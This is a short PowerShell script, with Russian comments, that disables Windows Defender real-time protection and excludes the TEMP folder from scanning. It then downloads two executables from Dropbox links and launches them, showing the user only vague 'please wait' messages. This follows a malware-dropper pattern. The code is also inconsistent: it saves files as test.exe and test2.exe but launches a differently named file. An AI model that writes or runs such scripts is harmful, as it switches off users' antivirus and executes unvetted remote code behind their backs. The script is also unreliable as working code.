# Отключаем защитник Windows и добавляем исключение для временной папки
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "$env:TEMP"

# Скачиваем первое приложение
Write-Host "Please whait." -ForegroundColor Green
Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/ysgkf4itfcy4do4sh22ug/test.exe?rlkey=kb77xr8jjz91q5wyqepzksoq3&st=ufblgjqa&dl=1' -OutFile "$env:TEMP\test.exe"

# Скачиваем второе приложение (замени URL на нужный)
Write-Host "Please whait.." -ForegroundColor Green
Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/1q3dximiu93lv6q2ivoms/InvisibleMan-TUN.exe?rlkey=y6ko79k3hvsq4ncolk5itu48p&st=xx2dgg32&dl=1' -OutFile "$env:TEMP\test2.exe"

# Запускаем первое приложение
Write-Host "Please whait..." -ForegroundColor Yellow
Start-Process "$env:TEMP\InvisibleMan-TUN.exe"

# Ждем 3 секунды
Write-Host "Please whait...." -ForegroundColor Cyan
Start-Sleep -Seconds 3

# Запускаем второе приложение
Write-Host "Please whait....." -ForegroundColor Yellow
Start-Process "$env:TEMP\InvisibleMan-TUN.exe"

Write-Host "Complete!" -ForegroundColor Green
